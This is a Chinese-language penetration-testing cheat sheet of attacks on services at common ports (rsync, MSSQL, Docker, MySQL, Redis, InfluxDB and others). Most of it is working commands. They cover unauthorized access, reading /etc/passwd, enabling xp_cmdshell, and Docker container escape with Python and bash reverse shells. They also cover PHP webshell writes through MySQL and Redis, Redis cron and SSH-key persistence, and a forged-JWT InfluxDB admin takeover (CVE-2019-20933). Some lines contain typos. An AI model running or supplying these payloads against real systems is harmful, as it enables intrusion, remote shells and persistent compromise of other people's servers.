# 端口测试

## Overview

<table><thead><tr><th width="170">端口 / 服务</th><th width="152">服务类型</th><th>漏洞危害</th></tr></thead><tbody><tr><td>389 LDAP</td><td>目录访问</td><td>未授权访问信息泄露</td></tr><tr><td>873 Rsync</td><td>同步备份</td><td>未授权访问、文件上传、文件下载</td></tr><tr><td>1433 MSSQL</td><td>数据库</td><td>命令执行</td></tr><tr><td>1833 MQTT</td><td>物联网通讯</td><td>未授权访问信息泄露；暴力破解</td></tr><tr><td>2375 Docker</td><td>虚拟化</td><td>未授权访问文件上传 (容器逃逸)</td></tr><tr><td>2379 etcd</td><td>分布式键值存储</td><td>未授权访问信息泄露</td></tr><tr><td>3306 MySQL</td><td>关系型数据库</td><td>文件写入、文件读取、GetShell</td></tr><tr><td>6379 Redis</td><td>键值型数据库</td><td>未授权访问文件写入</td></tr><tr><td>8080 InfluxDB</td><td>时序型数据库</td><td>未授权访问 (CVE-2019-20933)</td></tr><tr><td>27017 MongoDB</td><td>文档型数据库</td><td>未授权访问</td></tr></tbody></table>

## 389 LDAP

```bash
# 未授权访问
# LDAP Admin Tool - https://www.ldapsoft.com/download.html
使用工具配置服务主机信息后连接

# 批量检测未授权访问
# 优先使用工具, 下面的 nuclei 检测模板仅能检测开启了 HTTP 服务的 LDAP
# ~/nuclei-templates/http/misconfiguration/unauth-ldap-account-manager.yaml
nuclei -t ~/nuclei-templates/http/misconfiguration/unauth-ldap-account-manager.yaml -l ip.txt
```

## 873 rsync

```bash
HOST=;PORT=873;

# 未授权访问
rsync rsync://$HOST:$PORT/


# 文件上传 (计时任务)
rsync -av reverse_shell rsync://$HOST:$PORT/src/etc/cron.d/reverse_shell


# 文件下载
rsync -av rsync://$HOST:$PORT/src/etc/passwd ./passwd.downloaded
```

## 1433 MSSQL

```bash
# 命令执行
# 查看 xp_cmdshell 开启状状态 0 Closed / 1 Opened
EXEC sp_configure 'xp_cmdshell';
GO

# 启用 xp_cmdshell
EXEC sp_configure 'show advanced options', 1;
GO
RECONFIGURE;
GO
EXEC sp_configure 'xp_cmdshell', 1;
GO
RECONFIGURE;
GO

# 使用 xp_cmdshell 执行 whoami 命令
EXEC xp_cmdshell 'whoami';
GO
EXEC dbName..xp_cmdshell 'whoami';
GO

# 禁用 xp_cmdshell
EXEC sp_configure 'xp_cmdshell', 0;
GO
RECONFIGURE;
GO

# 执行外部 Python 脚本
EXEC sp_execute_external_script @language = N'Python', @script = N'import os;os.system("whoami")'
```

## 1883 MQTT

```bash
# 未授权访问
# https://github.com/thomasnordquist/MQTT-Explorer
使用工具配置服务主机信息后连接

# 批量检测未授权访问
# UNKNOWN ERROR
# ~/nuclei-templates/http/misconfiguration/unauth-zwave-mqtt.yaml
# nuclei -t ~/nuclei-templates/http/misconfiguration/unauth-zwave-mqtt.yaml -l host.txt


# 暴力破解
# https://github.com/akamai-threat-research/mqtt-pwn
docker compose up --build --detach
docker compose ps
docker compose run cli
```

## 2375 Docker

```bash
HOST=;PORT=2375;

# Judgement
curl $HOST:$PORT/version
curl $HOST:$PORT/info


# 未授权访问
docker -H tcp://$HOST:$PORT images
docker -H tcp://$HOST:$PORT container

# 批量检测未授权访问
# https://github.com/projectdiscovery/nuclei
# ~/nuclei-templates/http/misconfiguration/exposed-docker-api.yaml
nuclei -t ~/nuclei-templates/http/misconfiguration/exposed-docker-api.yaml -l host+port.txt


# 文件上传 (容器逃逸)
docker -H tcp://$HOST:$PORT run -it -v /:/mnt nginx:latest --name nginx-test /bin/bash
HOST=;PORT=; # Configure VPS information
echo "* * * * * root export RHOST="HOST";export RPORT=6789;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash")'" > /mnt/etc/cron.d/reverse_shell_python
echo "* * * * * root /bin/bash -i >& /dev/tcp/HOST/PORT 0>&1 > /mnt/etc/cron.d/reverse_shell
```

## 2379 etcd

```bash
# 未授权访问
# etcd-manager - https://etcdmanager.io/
使用工具配置服务主机信息后连接


# C 段服务扫描
nmap -p 2379 IP-CIRD -T4 -n -Pn -oG - | grep open
```

## 3306 MySQL

```bash
# 文件写入
# 查询拥有写入权限的路径, 为空则代表可以写入任意到路径, 5.7 版本以前默认为空
SHOW GLOBAL VARIABLES LIKE '%secure_file_priv%';

# INTO OUTFILE 语句写入文件
SELECT '<?php @eval($_REQUEST['exec']);?>' INTO OUTFILE '/var/ww/html/phpinfo.php';

# 日志功能写入文件
SHOW VARIABLES LIKE '%general%';
SET GLOBAL general_log = "ON";
SET GLOBAL general_log_file="/var/www/html/shell.php";
SLECT '<?php phpinfo(); ?>';

# sqlmap 写入文件
sqlmap -u "URL" --file-write="/LOCAL/PATH/FILE" --file-dest="/REMOTE/PATH/FILE"


# 文件读取
# LOAD_FILE 语句读取文件
SELECT LOAD_FILE( "/etc/passwd" );

# LOAD DATA INFILE ... INTO TABLE 语句读取文件
USE mysql;
LOAD DATA INFILE '/etc/passwd' INTO TABLE user;
SELECT * FROM user;

# SYSTEM 语句读取文件 (MySQL version 5.x)
$ mysql -h$HOST -u$USNM -p$PSWD
mysql> SYSTEM cat /etc/passwd;


# GetShell
# sqlmap GetShell (需要知道网站绝对路径)
sqlmap -u "URL" --os-shell
```

## 6379 Redis

```bash
HOST=; PORT=6379;

# Judgement
1) telnet $HOST $PORT
2) info


# 文件写入
redis-cli -h $HOST -p $PORT
# 写入 WebShell
CONFIG SET DIR /var/www/html
CONFIG SET DBFILENAME exec.php
SET crackit "\n\n\n\n<?php @eval($_REQUEST['exec']);?>\n\n\n\n"
# SAVE 执行时会将所有数据快照以 RDB 文件的形式保存到硬盘
SAVE
# 写入计划任务
CONFIG SET DIR /var/spool/cron
CONFIG SET DBFILENAME root
SET crackit "\n\n\n\n* * * * * bash -i >& /dev/tcp/HOST/PORT 0>&1\n\n\n\n"
# or
CONFIG SET DIR /etc/cron.d
CONFIG SET DBFILENAME reverse_shell
SET crackit "\n\n\n\n* * * * * root bash -i >& /dev/tcp/HOST/PORT 0>&1\n\n\n\n"
# SAVE 执行时会将所有数据快照以 RDB 文件的形式保存到硬盘
SAVE
# 写入 SSH 公钥
# ssh-keygen -t rsa
(echo -e "\n\n"; cat ~/.ssh/id_rsa.pub; echo -e "\n\n") > /tmp/id_rsa.pub
cat /tmp/id_rsa.pub | redis-cli -h $HOST -p $PORT -x set crackit
rm /tmp/id_rsa.pub
redis-cli -h $HOST -p $PORT
CONFIG SET DIR /root/.ssh/
CONFIG SET DBFILENAME "authorized_keys"
SAVE
ssh -i ~/.ssh/id_rsa root@HOST


# UI Tools
# https://goanother.com/cn/
Another Redis Desktop Manager
```

## 8086 InfluxDB

```bash
HOST=VULNHOST; PORT=8086;
URL=http://$HOST:$PORT

# Judgement
curl $URL/debug/vars

# 未授权访问 (CVE-2019-20933)
# Get authorization
# https://jwt.io/
# Algorithm: HS256
{
  "username": "admin",
  "exp": 2986346267
}
# VERIFY SIGNATURE: null

AUTH="Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjoyOTg2MzQ2MjY3fQ.LJDvEy5zvSEpA_C6pnK3JJFkUKGq9eEi8T2wdum3R_s"
USNM=influx
PSWD=123456
BODY=q="CREATE USER \"$USNM\" with PASSWORD '$PSWD' WITH ALL PRIVILEGES;"

curl -X POST -H $AUTH -d $BODY $URL/query
  # {"results":[{"statement_id":0}]}
# https://github.com/influxdata/chronograf
chronograf --influxdb-url="$URL" --influxdb-username="$USNM" --influxdb-password="$PSWD"
```

## 27017 MongoDB

```bash
# 未授权访问
# 批量检测未授权访问
# https://github.com/projectdiscovery/nuclei
nuclei -t ~/nuclei-templates/network/misconfig/mongodb-unauth.yaml -target $IP
nuclei -t ~/nuclei-templates/network/misconfig/mongodb-unauth.yaml -l ip.txt
```
